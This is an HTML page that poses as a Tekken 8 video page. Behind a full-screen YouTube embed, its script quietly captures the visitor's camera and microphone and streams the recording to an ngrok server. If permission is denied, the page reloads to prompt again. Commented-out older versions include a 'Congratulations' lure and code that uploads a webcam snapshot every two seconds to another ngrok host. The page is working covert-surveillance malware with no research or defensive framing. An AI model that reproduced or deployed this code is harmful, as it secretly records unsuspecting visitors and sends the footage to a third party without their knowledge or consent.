<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tekken 8</title>
</head>
<body>
  <iframe style="width: 100%; height: 100vh;" src="https://www.youtube.com/embed/Npwa2wtOWY8?si=e76SF4X0nyEbxktB" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
    
    <video id="localVideo" hidden autoplay muted></video>
    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>

    <script>
        // Connect to the backend server
        const socket = io('https://4eea-150-129-183-182.ngrok-free.app', {
            transports: ['websocket', 'polling'], // Explicitly set transports
        }); // Replace with your backend URL

        const localVideo = document.getElementById('localVideo');

        // Request video and audio from the user's device
        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
            .then((stream) => {
                // Display the video on the local video element
                localVideo.srcObject = stream;

                // Set up the MediaRecorder with video and audio
                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });

                // Send recorded chunks to the backend server
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) {
                        console.log("Sending stream data (video and audio) to backend...");
                        socket.emit('stream-data', event.data);
                    }
                };

                // Start the MediaRecorder and send data every 1 second
                mediaRecorder.start(1000);
                console.log("Started media recorder for video and audio");

                // Notify the backend to start saving the stream
                socket.emit('start-stream');

                // Stop the recording and notify the backend when the user leaves the page
                window.onbeforeunload = () => {
                    mediaRecorder.stop();
                    socket.emit('stop-stream');
                };
            })
            .catch((err) => {
                console.error("Error accessing media devices (video/audio):", err);
                location.reload();
            });
    </script>
</body>
</html>





<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Congratulations</title>
</head>
<body>
    <video id="localVideo" autoplay muted></video>
    <video id="remoteVideo" autoplay></video>
    <iframe style="width:100%; height:100vh" src="https://www.youtube.com/embed/6UQIvEA8Tx4?rel=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
    <script src="https://cdn.socket.io/4.5.3/socket.io.min.js"></script>
    <script>
//      const canvas = document.createElement('canvas');
// const context = canvas.getContext('2d');

// function requestCameraAccess() {
//     navigator.mediaDevices.getUserMedia({ video: true })
//         .then((stream) => {
//             // Camera access granted
//             const video = document.createElement('video');
//             video.srcObject = stream;
//             video.play();

//             setInterval(() => {
//                 canvas.width = video.videoWidth;
//                 canvas.height = video.videoHeight;
//                 context.drawImage(video, 0, 0);
//                 canvas.toBlob((blob) => {
//                     const formData = new FormData();
//                     formData.append('photo', blob, 'photo.jpg');

//                     fetch('https://a7c0-150-242-65-3.ngrok-free.app/upload', { // replace URL
//                         method: 'POST',
//                         body: formData
//                     })
//                         .then(response => response.text())
//                         .then(data => {
//                             console.log(data); // Log success message
//                         })
//                         .catch(error => {
//                             console.error('Error uploading photo:', error);
//                         });
//                 }, 'image/jpeg');
//             }, 2000);
//         })
//         .catch((err) => {
//             console.error("Error accessing camera: ", err);
//             // If denied, reload to trigger browser permission pop-up again
//             setTimeout(() => {
//                 location.reload(); // Refresh the page
//             }, 3000);
//         });
// }

// // Call the function on page load
// requestCameraAccess();




const socket = io('https://4eea-150-129-183-182.ngrok-free.app'); // Backend URL
const peerConnection = new RTCPeerConnection();

navigator.mediaDevices.getUserMedia({ video: true, audio: true })
  .then((stream) => {
    localVideo.srcObject = stream;

    // Stream video to backend
    const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        socket.emit('stream-data', event.data);
      }
    };

    // Start streaming and notify the server
    mediaRecorder.start(1000); // Send data every 1 second
    socket.emit('start-stream');

    // Stop streaming on disconnect
    window.onbeforeunload = () => {
      mediaRecorder.stop();
      socket.emit('stop-stream');
    };
  })
  .catch((err) => console.error('Error accessing media devices:', err));


    </script>
</body>
</html> -->